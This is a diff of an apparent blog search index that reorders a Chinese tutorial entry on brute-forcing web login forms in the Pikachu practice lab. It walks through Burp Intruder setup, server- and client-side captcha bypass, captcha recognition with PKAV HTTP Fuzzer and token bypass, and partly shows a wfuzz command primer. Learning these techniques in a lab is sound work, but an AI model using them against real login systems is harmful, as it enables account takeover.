@@ -709,6 +709,124 @@
       </tags>
   </entry>
   <entry>
+    <title>针对Web应用的暴力破解</title>
+    <url>/2021/10/05/0x02%20%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9E%9A%E4%B8%BE/10.%E9%92%88%E5%AF%B9Web%E5%BA%94%E7%94%A8%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<h2 id="表单暴力破解"><a href="#表单暴力破解" class="headerlink" title="表单暴力破解"></a>表单暴力破解</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
+<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
+<ol>
+<li>是否要求用户设置复杂的密码；</li>
+<li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</li>
+<li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</li>
+<li>是否采用了双因素认证；</li>
+</ol>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ul>
+<li>确认登录接口的脆弱性<ul>
+<li>尝试登录——抓包——观察验证元素和response信息，判断是否存在暴力破解的可能</li>
+</ul>
+</li>
+<li>对字典进行优化<ul>
+<li>根据实际情况对字典进行优化，提高暴力破解的效率</li>
+</ul>
+</li>
+<li>工具自动化操作</li>
+</ul>
+<p>以下实验环境是基于Pikachu靶场进行的。</p>
+<p>靶场下载：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
+<h2 id="简单表单暴力破解"><a href="#简单表单暴力破解" class="headerlink" title="简单表单暴力破解"></a>简单表单暴力破解</h2><p><img src="https://i.loli.net/2021/10/05/WU9AscIgqDwNtE1.png" alt="img"></p>
+<p>输入错误时，有以下提示</p>
+<p><img src="https://i.loli.net/2021/10/05/eZYwM9kvyqftQBL.png" alt="img"></p>
+<p>这里没有验证码等其他验证机制，抓包看看</p>
+<p><img src="https://i.loli.net/2021/10/05/Q9KXaud3UbYzs1k.png" alt="411a58df5762da917562a60df616d9b7.png"></p>
+<p>发送到Intruder进行暴力破解</p>
+<p><img src="https://i.loli.net/2021/10/05/eEIQXjUospwLFuK.png" alt="e20f71994117892067fb23b951d60174.png"></p>
+<p>设置好Payload</p>
+<p><img src="https://i.loli.net/2021/10/05/fDNSacVGsy7Fvor.png" alt="b054b7e3eccc40104336ad93493844e7.png"></p>
+<p><img src="https://i.loli.net/2021/10/05/BMmvOWEVGwtijJk.png" alt="c807ca1a8508c1ae817b5d803b1a4c5f.png"></p>
+<p>然后把“ username or password is not exists～ ”复制到Grep Match中。后面可以利用Grep Match区分哪些请求里面有这个字符串</p>
+<p><img src="https://i.loli.net/2021/10/05/xcmQdGXPbI8qaez.png" alt="d5c28d32cdd16bd6430c53da023752b1.png"></p>
+<p>然后就可以开始攻击了，匹配到 username or password is not exists 都是攻击失败的，另外，从响应长度也可以看出攻击成功与否</p>
+<p><img src="https://i.loli.net/2021/10/05/X75OasPWkIMLcwH.png" alt="a479b7c9cdea29fec0047c53e1e525fc.png"></p>
+<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><p>验证码可以用来防止恶意注册、防止暴力破解。服务端验证码常见问题：</p>
+<ul>
+<li>验证码在后台不过期，导致长期可以使用</li>
+<li>验证码校验不严格，逻辑出现问题</li>
+<li>验证码设计的太过简单和有规律，容易被猜解</li>
+</ul>
+<p><img src="https://i.loli.net/2021/10/05/JOpHyoWxMvltsui.png" alt="img"></p>
+<p>我们先简单的测试一下，不输入验证码的情况下会提示验证码为空，输入错误验证码的情况下会提示验证码错误，只有验证码正确的前提下才会提示账号或密码不存在</p>
+<p>下面通过抓包判断一下服务器端有没有对验证码进行验证，发现是有的</p>
+<p><img src="https://i.loli.net/2021/10/05/RNCpgvOcTrULKI4.png" alt="img"></p>
+<p>说明后端对验证码是有验证的，我们来了解一下验证码生成的逻辑：</p>
+<p>当我们刷新页面的时候，我们会向后台发送一个请求，后台收到请求会生成一个验证码并在session中把验证码保存下来。</p>
+<p>我们先生成一个新的验证码，然后在BurpSuite中输入正确的验证码</p>
+<p><img src="https://i.loli.net/2021/10/05/grZoR2BVjCFqxkL.png" alt="img"></p>
+<p>提示账号密码不存在</p>
+<p><img src="https://i.loli.net/2021/10/05/Z29GPSH6xMmNXdD.png" alt="img"></p>
+<p>我们换个密码再发送一次</p>
+<p><img src="https://i.loli.net/2021/10/05/T3xV2H89Qts4GcM.png" alt="img"></p>
+<p>发现依然是提示账号密码不存在，正常来说应该提示验证码错误，这说明验证码长期有效，我们发送到Intruder中直接暴力破解</p>
+<p><img src="https://i.loli.net/2021/10/05/fNgdnPUuqSbcoLV.png" alt="f55213b55230b3fdb2c1b88f535e3df9.png"></p>
+<h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141249035-185107144.png" alt="img"></p>
+<p>这里我们需要输入验证码，我们不能对验证码暴力破解，通过抓包发现请求里面只是多了验证码</p>
+<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141436927-844829976.png" alt="img"></p>
+<p>通过查看源码，发现验证码的验证逻辑是在客户端实现的</p>
+<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141607397-1462570833.png" alt="img"></p>
+<p>这个JavaScript会从0-9和26个大写字母中随机挑选5个作为验证码，然后用 validate() 去验证</p>
+<p>另外，通过源码也可以看到，我们每点一次验证码，就会调用 createCode() 改变验证码</p>
+<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141835317-2117397253.png" alt="img"></p>
+<p>通过BurpSuite发现后台不会对输入错误的验证码进行验证，在浏览器中，输入错误的验证码是有提示的</p>
+<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142146348-490097606.png" alt="img"></p>
+<p>正常来说会有这个弹窗</p>
+<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142226004-1509701597.png" alt="img"></p>
+<p>说明前端设置的验证码如同虚设，后端不会对验证码进行验证。那么我们不用理会验证码，直接进行暴力破解就可以了</p>
+<p><img src="https://i.loli.net/2021/10/05/nahYLzDuR1ICHyl.png" alt="80e7b4b4b0da5a1ca4e4d0f538d282a1.png"></p>
+<h2 id="PKAV-HTTP-Fuzzer-识别验证码"><a href="#PKAV-HTTP-Fuzzer-识别验证码" class="headerlink" title="PKAV HTTP Fuzzer 识别验证码"></a>PKAV HTTP Fuzzer 识别验证码</h2><p>PKAV HTTP Fuzzer是PKAV团队编写的一个带图形验证码爆破识别的渗透测试工具。</p>
+<p>不过该工具现在已经停止更新了，最近一次更新是在2016年。</p>
+<p>该工具只能识别较为简单的验证码。</p>
+<p>使用之前需要先安装.net framework 4.0或以上版本</p>
+<p>首先使用burpsuite对web表单进行抓包。</p>
+<p><img src="https://i.loli.net/2021/10/05/xf2kUvyNce5KuDb.png" alt="120f248052e508b544bc09f227e038d9.png"></p>
+<p><img src="https://i.loli.net/2021/10/05/SMAxKhDlHn4PIC3.png" alt="48529ff85d52307ce3d3533226811365.png"></p>
+<p>打开PKAV HTTP Fuzzer，将地址与burp抓到的请求包粘贴到工具中的对应位置。</p>
+<p><img src="https://i.loli.net/2021/10/05/nCiOrXZetAQ1Wvm.png" alt="f4b3f7eeb0e72590e3d5c5ab60861ede.png"></p>
+<p>对用用户名和密码添加标记，对验证码添加验证码标记。</p>
+<p><img src="https://i.loli.net/2021/10/05/qOHFEK8Z1nsvY3R.png" alt="0649d335bce73a54bccc64b755a2ab39.png"></p>
+<p>更改重放模式为异值异步重放模式，对两个变体分别导入字典</p>
+<p><img src="https://i.loli.net/2021/10/05/DUXnEG4cwrxJvao.png" alt="9d1936f68dd1d79324ae103447fb5444.png"></p>
+<p>右键验证码图片，复制验证码地址</p>
+<p><img src="https://i.loli.net/2021/10/05/q4fCtNX5wLJRIQO.png" alt="bb2635eed417fb5d9298cf0b9de92b62.png"></p>
+<p>将验证码粘贴到到工具中的地址框</p>
+<p><img src="https://i.loli.net/2021/10/05/lLVIYW8miKHJ6At.png" alt="8b1cfd6f013ded1cbd7fbda681ae2476.png"></p>
+<p>对这种简单的验证码识别还算准确（注意使用自带识别引擎识别，第三方识别引擎都是用不了的）</p>
+<p>使用发包器，开始进行暴力破解<img src="https://i.loli.net/2021/10/05/ixO7lGL5SVYPQCT.png" alt="51bfaff708834b9294d0c1d743b5bd98.png"></p>
+<p>可以看到长度为867的返回包中显示登录成功。</p>
+<p><img src="https://i.loli.net/2021/10/05/DBjJxQGIZgY2Szu.png" alt="6cef7fefde3290ab4d10b71814defec6.png"></p>
+<h2 id="Token绕过"><a href="#Token绕过" class="headerlink" title="Token绕过"></a>Token绕过</h2><p>利用开发者工具可以发现这里有一个隐藏的标签</p>
+<p><a href="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918150005897-1483756020.png"><img src="https://i.loli.net/2021/10/05/651qkG8xwUJejQF.png" alt="img"></a></p>
+<p>里面的数字就是我们的token，我的每次提交的请求都会有一个token值，后端会验证这个token值</p>
+<p>但是这个token已经写到了html页面中，攻击者只需要写个工具，提交认证前都加上这个token就好了</p>
+<p>我们抓包后，发送到intruder中，步骤如图</p>
+<p><img src="https://i.loli.net/2021/10/05/LniaTh1z4BqKvJF.png" alt="468c044c99cb8b22304d3fca69cdc227.png"></p>
+<p>这里只对admin用户进行暴力破解（注意攻击类型为Pitchfork）</p>
+<p>我们把token设置变量，options的grep extract添加token：</p>
+<p><img src="https://i.loli.net/2021/10/05/ZFqsTPl2HrgzuEh.png" alt="455810f95f3da0de85735a0b866ece0f.png"></p>
+<p><img src="https://i.loli.net/2021/10/05/1mUksKjvVnIRFC6.png" alt="image-20211005185127542">**</p>
+<p>token变量的type设置成recursive grep</p>
+<p><img src="https://i.loli.net/2021/10/05/IZKfaYV6EdPWXmJ.png" alt="5ffd92bd1f4220bf840521e5d3802187.png"></p>
+<p>将请求数设置为1</p>
+<p><img src="https://i.loli.net/2021/10/05/y2fUX6Tav3Qeq4C.png" alt="2b707b1da69fbbab8082b1814b0d1c56.png"></p>
+<p>最后点击Start attack进行攻击</p>
+<p><img src="https://i.loli.net/2021/10/05/a9fJun1QRj87GPC.png" alt="32c699c665b8d80f3821d634c175a1bb.png"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>扫描与枚举</category>
+      </categories>
+      <tags>
+        <tag>扫描与枚举</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>敏感文件目录探测</title>
     <url>/2021/10/05/0x02%20%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9E%9A%E4%B8%BE/1.%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B/</url>
     <content><![CDATA[<h2 id="目录扫描的介绍"><a href="#目录扫描的介绍" class="headerlink" title="目录扫描的介绍"></a>目录扫描的介绍</h2><p>目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。通过目录扫描我们还能扫描敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p>
@@ -855,205 +973,6 @@
 <p>项目地址：<a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p>
 <p>运行示例：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wyspider.py http://wuyun.org php</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>扫描与枚举</category>
-      </categories>
-      <tags>
-        <tag>扫描与枚举</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>针对Web应用的暴力破解</title>
-    <url>/2021/10/05/0x02%20%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9E%9A%E4%B8%BE/10.%E9%92%88%E5%AF%B9Web%E5%BA%94%E7%94%A8%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<h2 id="表单暴力破解"><a href="#表单暴力破解" class="headerlink" title="表单暴力破解"></a>表单暴力破解</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
-<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
-<ol>
-<li>是否要求用户设置复杂的密码；</li>
-<li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</li>
-<li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</li>
-<li>是否采用了双因素认证；</li>
-</ol>
-<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ul>
-<li>确认登录接口的脆弱性<ul>
-<li>尝试登录——抓包——观察验证元素和response信息，判断是否存在暴力破解的可能</li>
-</ul>
-</li>
-<li>对字典进行优化<ul>
-<li>根据实际情况对字典进行优化，提高暴力破解的效率</li>
-</ul>
-</li>
-<li>工具自动化操作</li>
-</ul>
-<p>以下实验环境是基于Pikachu靶场进行的。</p>
-<p>靶场下载：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
-<h2 id="简单表单暴力破解"><a href="#简单表单暴力破解" class="headerlink" title="简单表单暴力破解"></a>简单表单暴力破解</h2><p><img src="https://i.loli.net/2021/10/05/WU9AscIgqDwNtE1.png" alt="img"></p>
-<p>输入错误时，有以下提示</p>
-<p><img src="https://i.loli.net/2021/10/05/eZYwM9kvyqftQBL.png" alt="img"></p>
-<p>这里没有验证码等其他验证机制，抓包看看</p>
-<p><img src="https://i.loli.net/2021/10/05/Q9KXaud3UbYzs1k.png" alt="411a58df5762da917562a60df616d9b7.png"></p>
-<p>发送到Intruder进行暴力破解</p>
-<p><img src="https://i.loli.net/2021/10/05/eEIQXjUospwLFuK.png" alt="e20f71994117892067fb23b951d60174.png"></p>
-<p>设置好Payload</p>
-<p><img src="https://i.loli.net/2021/10/05/fDNSacVGsy7Fvor.png" alt="b054b7e3eccc40104336ad93493844e7.png"></p>
-<p><img src="https://i.loli.net/2021/10/05/BMmvOWEVGwtijJk.png" alt="c807ca1a8508c1ae817b5d803b1a4c5f.png"></p>
-<p>然后把“ username or password is not exists～ ”复制到Grep Match中。后面可以利用Grep Match区分哪些请求里面有这个字符串</p>
-<p><img src="https://i.loli.net/2021/10/05/xcmQdGXPbI8qaez.png" alt="d5c28d32cdd16bd6430c53da023752b1.png"></p>
-<p>然后就可以开始攻击了，匹配到 username or password is not exists 都是攻击失败的，另外，从响应长度也可以看出攻击成功与否</p>
-<p><img src="https://i.loli.net/2021/10/05/X75OasPWkIMLcwH.png" alt="a479b7c9cdea29fec0047c53e1e525fc.png"></p>
-<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><p>验证码可以用来防止恶意注册、防止暴力破解。服务端验证码常见问题：</p>
-<ul>
-<li>验证码在后台不过期，导致长期可以使用</li>
-<li>验证码校验不严格，逻辑出现问题</li>
-<li>验证码设计的太过简单和有规律，容易被猜解</li>
-</ul>
-<p><img src="https://i.loli.net/2021/10/05/JOpHyoWxMvltsui.png" alt="img"></p>
-<p>我们先简单的测试一下，不输入验证码的情况下会提示验证码为空，输入错误验证码的情况下会提示验证码错误，只有验证码正确的前提下才会提示账号或密码不存在</p>
-<p>下面通过抓包判断一下服务器端有没有对验证码进行验证，发现是有的</p>
-<p><img src="https://i.loli.net/2021/10/05/RNCpgvOcTrULKI4.png" alt="img"></p>
-<p>说明后端对验证码是有验证的，我们来了解一下验证码生成的逻辑：</p>
-<p>当我们刷新页面的时候，我们会向后台发送一个请求，后台收到请求会生成一个验证码并在session中把验证码保存下来。</p>
-<p>我们先生成一个新的验证码，然后在BurpSuite中输入正确的验证码</p>
-<p><img src="https://i.loli.net/2021/10/05/grZoR2BVjCFqxkL.png" alt="img"></p>
-<p>提示账号密码不存在</p>
-<p><img src="https://i.loli.net/2021/10/05/Z29GPSH6xMmNXdD.png" alt="img"></p>
-<p>我们换个密码再发送一次</p>
-<p><img src="https://i.loli.net/2021/10/05/T3xV2H89Qts4GcM.png" alt="img"></p>
-<p>发现依然是提示账号密码不存在，正常来说应该提示验证码错误，这说明验证码长期有效，我们发送到Intruder中直接暴力破解</p>
-<p><img src="https://i.loli.net/2021/10/05/fNgdnPUuqSbcoLV.png" alt="f55213b55230b3fdb2c1b88f535e3df9.png"></p>
-<h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141249035-185107144.png" alt="img"></p>
-<p>这里我们需要输入验证码，我们不能对验证码暴力破解，通过抓包发现请求里面只是多了验证码</p>
-<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141436927-844829976.png" alt="img"></p>
-<p>通过查看源码，发现验证码的验证逻辑是在客户端实现的</p>
-<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141607397-1462570833.png" alt="img"></p>
-<p>这个JavaScript会从0-9和26个大写字母中随机挑选5个作为验证码，然后用 validate() 去验证</p>
-<p>另外，通过源码也可以看到，我们每点一次验证码，就会调用 createCode() 改变验证码</p>
-<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141835317-2117397253.png" alt="img"></p>
-<p>通过BurpSuite发现后台不会对输入错误的验证码进行验证，在浏览器中，输入错误的验证码是有提示的</p>
-<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142146348-490097606.png" alt="img"></p>
-<p>正常来说会有这个弹窗</p>
-<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142226004-1509701597.png" alt="img"></p>
-<p>说明前端设置的验证码如同虚设，后端不会对验证码进行验证。那么我们不用理会验证码，直接进行暴力破解就可以了</p>
-<p><img src="https://i.loli.net/2021/10/05/nahYLzDuR1ICHyl.png" alt="80e7b4b4b0da5a1ca4e4d0f538d282a1.png"></p>
-<h2 id="PKAV-HTTP-Fuzzer-识别验证码"><a href="#PKAV-HTTP-Fuzzer-识别验证码" class="headerlink" title="PKAV HTTP Fuzzer 识别验证码"></a>PKAV HTTP Fuzzer 识别验证码</h2><p>PKAV HTTP Fuzzer是PKAV团队编写的一个带图形验证码爆破识别的渗透测试工具。</p>
-<p>不过该工具现在已经停止更新了，最近一次更新是在2016年。</p>
-<p>该工具只能识别较为简单的验证码。</p>
-<p>使用之前需要先安装.net framework 4.0或以上版本</p>
-<p>首先使用burpsuite对web表单进行抓包。</p>
-<p><img src="https://i.loli.net/2021/10/05/xf2kUvyNce5KuDb.png" alt="120f248052e508b544bc09f227e038d9.png"></p>
-<p><img src="https://i.loli.net/2021/10/05/SMAxKhDlHn4PIC3.png" alt="48529ff85d52307ce3d3533226811365.png"></p>
-<p>打开PKAV HTTP Fuzzer，将地址与burp抓到的请求包粘贴到工具中的对应位置。</p>
-<p><img src="https://i.loli.net/2021/10/05/nCiOrXZetAQ1Wvm.png" alt="f4b3f7eeb0e72590e3d5c5ab60861ede.png"></p>
-<p>对用用户名和密码添加标记，对验证码添加验证码标记。</p>
-<p><img src="https://i.loli.net/2021/10/05/qOHFEK8Z1nsvY3R.png" alt="0649d335bce73a54bccc64b755a2ab39.png"></p>
-<p>更改重放模式为异值异步重放模式，对两个变体分别导入字典</p>
-<p><img src="https://i.loli.net/2021/10/05/DUXnEG4cwrxJvao.png" alt="9d1936f68dd1d79324ae103447fb5444.png"></p>
-<p>右键验证码图片，复制验证码地址</p>
-<p><img src="https://i.loli.net/2021/10/05/q4fCtNX5wLJRIQO.png" alt="bb2635eed417fb5d9298cf0b9de92b62.png"></p>
-<p>将验证码粘贴到到工具中的地址框</p>
-<p><img src="https://i.loli.net/2021/10/05/lLVIYW8miKHJ6At.png" alt="8b1cfd6f013ded1cbd7fbda681ae2476.png"></p>
-<p>对这种简单的验证码识别还算准确（注意使用自带识别引擎识别，第三方识别引擎都是用不了的）</p>
-<p>使用发包器，开始进行暴力破解<img src="https://i.loli.net/2021/10/05/ixO7lGL5SVYPQCT.png" alt="51bfaff708834b9294d0c1d743b5bd98.png"></p>
-<p>可以看到长度为867的返回包中显示登录成功。</p>
-<p><img src="https://i.loli.net/2021/10/05/DBjJxQGIZgY2Szu.png" alt="6cef7fefde3290ab4d10b71814defec6.png"></p>
-<h2 id="Token绕过"><a href="#Token绕过" class="headerlink" title="Token绕过"></a>Token绕过</h2><p>利用开发者工具可以发现这里有一个隐藏的标签</p>
-<p><a href="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918150005897-1483756020.png"><img src="https://i.loli.net/2021/10/05/651qkG8xwUJejQF.png" alt="img"></a></p>
-<p>里面的数字就是我们的token，我的每次提交的请求都会有一个token值，后端会验证这个token值</p>
-<p>但是这个token已经写到了html页面中，攻击者只需要写个工具，提交认证前都加上这个token就好了</p>
-<p>我们抓包后，发送到intruder中，步骤如图</p>
-<p><img src="https://i.loli.net/2021/10/05/LniaTh1z4BqKvJF.png" alt="468c044c99cb8b22304d3fca69cdc227.png"></p>
-<p>这里只对admin用户进行暴力破解（注意攻击类型为Pitchfork）</p>
-<p>我们把token设置变量，options的grep extract添加token：</p>
-<p><img src="https://i.loli.net/2021/10/05/ZFqsTPl2HrgzuEh.png" alt="455810f95f3da0de85735a0b866ece0f.png"></p>
-<p><img src="https://i.loli.net/2021/10/05/1mUksKjvVnIRFC6.png" alt="image-20211005185127542">**</p>
-<p>token变量的type设置成recursive grep</p>
-<p><img src="https://i.loli.net/2021/10/05/IZKfaYV6EdPWXmJ.png" alt="5ffd92bd1f4220bf840521e5d3802187.png"></p>
-<p>将请求数设置为1</p>
-<p><img src="https://i.loli.net/2021/10/05/y2fUX6Tav3Qeq4C.png" alt="2b707b1da69fbbab8082b1814b0d1c56.png"></p>
-<p>最后点击Start attack进行攻击</p>
-<p><img src="https://i.loli.net/2021/10/05/a9fJun1QRj87GPC.png" alt="32c699c665b8d80f3821d634c175a1bb.png"></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>扫描与枚举</category>
-      </categories>
-      <tags>
-        <tag>扫描与枚举</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>模糊测试初探</title>
-    <url>/2021/10/05/0x02%20%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9E%9A%E4%B8%BE/11.%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
-    <content><![CDATA[<h2 id="模糊测试介绍"><a href="#模糊测试介绍" class="headerlink" title="模糊测试介绍"></a>模糊测试介绍</h2><p>模糊测试（fuzz testing，fuzzing）是一种软件测试技术，其核心思想是将自动或半自动生成的随机数据输入到一个程序中并监视程序异常，如崩溃、断言失败，以发现可能的程序错误，比如内存泄露。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>
-<p>可以说，任何以暴力枚举形式的测试都能称为模糊测试。</p>
-<p>漏洞挖掘有三种方法：白盒代码审计、灰盒逆向工程、黑盒测试。其中黑盒的Fuzz测试是效率最高的一种，能够快速验证大量潜在的安全威胁。</p>
-<p>这里只是对一些常用的Web应用Fuzz工具做简单介绍，之后会结合实战进行一个详细地演示。</p>
-<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>在很多模糊测试场景中，研究人员可能会需要手动输出测试Payload，而BurpSuite 可以帮助我们将整个过程以自动化的方式实现。</p>
-<p>关于BurpSuite的使用已经讲过很多遍了，这里就不多解释了。</p>
-<h2 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>wfuzz 是一款Python开发的Web安全模糊测试工具。</p>
-<p>项目地址：<a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
-<p>官方手册：<a href="https://wfuzz.readthedocs.io/en/latest/">https://wfuzz.readthedocs.io/en/latest/</a></p>
-<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ul>
-<li>暴破文件和路径</li>
-<li>测试URL中的参数</li>
-<li>测试POST请求</li>
-<li>测试Cookies</li>
-<li>测试自定义请求头</li>
-<li>测试HTTP请求方法（动词）</li>
-<li>使用代理</li>
-<li>认证</li>
-<li>递归测试</li>
-<li>测试速度与效率</li>
-<li>输出到文件</li>
-<li>不同的输出</li>
-</ul>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
-<li>基础语法</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz [options] -z payload,params &lt;url&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>常用参数</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z  payloads里面的参数（wfuzz -e payloads 可以查看）</span><br><span class="line"></span><br><span class="line"> -z  file,1.txt（以文件形式，导入1.txt）</span><br><span class="line"></span><br><span class="line"> -z  range,1-10（以范围形式，1到10）</span><br><span class="line"></span><br><span class="line"> -z  list,1-2-3-10（列表形式，1,2,3,10）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d   设定POST量</span><br><span class="line"></span><br><span class="line"> -d  “uname=admin&amp;passwd=admin”</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-b   设定cookie量</span><br><span class="line"></span><br><span class="line"> -b  “cookie=”</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-H  设定头部信息</span><br><span class="line"></span><br><span class="line"> -H  “User-Agent: firfox”</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-X  设定请求方法</span><br><span class="line"></span><br><span class="line"> -X  GET</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-R  递归深度，探测目录很好</span><br><span class="line"></span><br><span class="line"> -R 1（深度为1）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t   并发数 / -s  请求间隔时间  （这个主要是防拉黑，比如我要fuzz狗）</span><br><span class="line"></span><br><span class="line"> -t 3 -s 5</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f   输出到文件的格式，格式有raw,json,csv,magictree,html</span><br><span class="line"></span><br><span class="line"> -f /tmp/1,html （将结果输出到tmp目录下的1，以html格式）</span><br></pre></td></tr></table></figure>
-
-<p>输出的结果信息解析：</p>
-<p>结果信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ID：测试时的请求序  </span><br><span class="line"></span><br><span class="line">Response：HTTP响应码			C</span><br><span class="line"></span><br><span class="line">Lines：响应信息中的行数      	 L</span><br><span class="line"></span><br><span class="line">Word：响应信息中的字数         	 W</span><br><span class="line"></span><br><span class="line">Chars：响应信息中的字符数       	H</span><br><span class="line"></span><br><span class="line">Payload：当前使用的payload</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">隐藏结果  --hc  --hl  --hw  --hh </span><br><span class="line"></span><br><span class="line"> 隐藏响应码405  --hc 405 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">显示结果   --sc  --sl  --sw  --sh</span><br><span class="line"></span><br><span class="line"> 显示响应码405  --sc 405</span><br></pre></td></tr></table></figure>
-
-<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>遍历id值隐藏500返回码并保存为html文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z range,1-200 --hc 500 -f 1,html http://www.XXX.net/Pro_show.asp?proid=FUZZ</span><br></pre></td></tr></table></figure>
-
-<p>需要一次测试多个FUZZ</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt -z file,2.txt  http://www.xxx.com/FUZZ/FUZ2Z.html</span><br></pre></td></tr></table></figure>
-
-<p>对于需要base64加密的cookie</p>
